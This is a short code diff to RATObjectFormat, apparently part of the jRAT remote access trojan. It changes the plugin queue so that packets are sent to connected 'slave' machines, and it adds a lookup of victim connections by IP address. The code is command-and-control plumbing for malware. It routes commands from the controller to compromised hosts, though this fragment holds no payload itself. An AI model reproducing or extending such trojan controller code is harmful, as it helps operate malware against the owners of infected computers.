@@ -11,7 +11,10 @@ import org.jrat.project.api.PacketBuilder;
 import org.jrat.project.api.Queue;
 import org.jrat.project.api.RATObject;
 
+import com.redpois0n.Main;
 import com.redpois0n.Slave;
+import com.redpois0n.net.ConnectionHandler;
+import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 
 public class RATObjectFormat {
 
@@ -111,11 +114,42 @@ public class RATObjectFormat {
 			
 		}, in, out, new Queue() {
 			@Override
-			public void addToSendQueue(PacketBuilder arg0, RATObject rat) throws Exception {
-				arg0.write(rat);
+			public void addToSendQueue(final PacketBuilder arg0, final RATObject rat) throws Exception {
+				AbstractOutgoingPacket packet = new AbstractOutgoingPacket() {
+					@Override
+					public void write(Slave slave, DataOutputStream dos) throws Exception {
+						arg0.write(dos);
+					}
+					@Override
+					public byte getPacketId() {
+						return arg0.getHeader();
+					}
+				};
+				
+				Slave slave = getFromRATObject(rat);
+				
+				if (slave != null) {
+					packet.send(slave, slave.getDataOutputStream());
+				} else {
+					throw new NullPointerException("No connection found for IP " + rat.getIP());
+				}
 			}	
 		});
 		return j;
+	}
+	
+	public static Slave getFromRATObject(RATObject obj) {
+		String ip = obj.getIP();
+		
+		for (int i = 0; i < Main.connections.size(); i++) {
+			Slave slave = Main.connections.get(i);
+			
+			if (slave.getIP().equals(ip)) {
+				return slave;
+			}
+		}
+		
+		return null;
 	}
 
 }
